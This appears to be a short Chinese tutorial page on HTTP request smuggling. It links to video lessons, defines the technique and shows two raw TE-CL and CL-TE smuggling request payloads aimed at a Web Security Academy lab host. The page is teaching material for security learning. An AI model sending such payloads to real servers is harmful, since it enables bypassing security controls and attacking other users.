# Http Smuggling

[YouTube系列教程](https://www.youtube.com/watch?v=Dsy9CxjNCYE&list=PLgZqc0esdeS-AEqmdmoxroGu5b08Wbb0f)
<iframe width="720px" height="480px" src="https://www.youtube.com/embed/Dsy9CxjNCYE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

[B站系列教程](https://www.bilibili.com/medialist/play/282616786?from=space&business=space_series&business_id=2262479&desc=1&spm_id_from=333.999.0.0)
<iframe src="//player.bilibili.com/player.html?aid=641345810&bvid=BV18Y4y1b7hk&cid=711950088&page=1"  frameborder="no"  allowfullscreen="true" style="width:720px;height:480px"> 
</iframe>

## 什么是 Http Smuggling
HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。

![er](/imgs/web/exploits/smuggling/1.png)

![er](/imgs/web/exploits/smuggling/2.png)

![er](/imgs/web/exploits/smuggling/3.png)

<DocsAD/>

## CL(TE) - TE(CL)
* Content-Length
* Transfer-Encoding

## TE-CL
```js
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: x
Transfer-Encoding: chunked

aa

GET /404 HTTP/1.1
X-Ignore: X

0
```

## CL-TE
```js
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X

0
```